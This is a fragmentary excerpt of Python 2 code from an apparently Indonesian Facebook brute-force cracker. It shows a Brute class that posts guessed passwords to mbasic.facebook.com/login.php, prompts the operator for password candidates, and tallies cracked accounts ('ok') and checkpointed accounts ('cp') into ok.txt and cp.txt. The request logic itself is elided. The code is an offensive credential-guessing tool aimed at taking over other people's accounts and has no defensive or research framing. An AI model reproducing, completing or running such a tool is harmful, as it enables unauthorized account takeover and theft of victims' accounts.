...
class Brute:
    ...
    def bruteRequest(self, username, password):
        ...
        api = 'https://mbasic.facebook.com/login.php'
    ...
    def main(self):
        ...
        if ask.lower() == 'm':
            while True:
                print ' \x1b[1;97m[*] Contoh : \x1b[1;92msayang,pengen,ngentot '
    ...
    def results(self):
        if len(self.ok) != 0:
            print '\n\n\x1b[1;92mSuccesfull : ' + str(len(self.ok))
            for i in self.ok:
                print '\x1b[1;92m [Succesfull] ' + str(i) 

            print '\x1b[1;97mAccount Succesfull Tersimpan Di :\x1b[1;92m ok.txt'
        if len(self.cp) != 0:
            print '\n\n\x1b[1;93mCheckpoint :\x1b[0;93m ' + str(len(self.cp))
            for i in self.cp:
                print '\x1b[1;93m [Checkpoint] ' + str(i) 

            print '\x1b[1;97mAccount Checkpoint Tersimpan Di :\x1b[1;93m cp.txt'
        if len(self.cp) == 0 and len(self.ok) == 0:
            print '\n\x1b[1;91m Tidak Mendapatkan Hasil \x1b[0m\n'
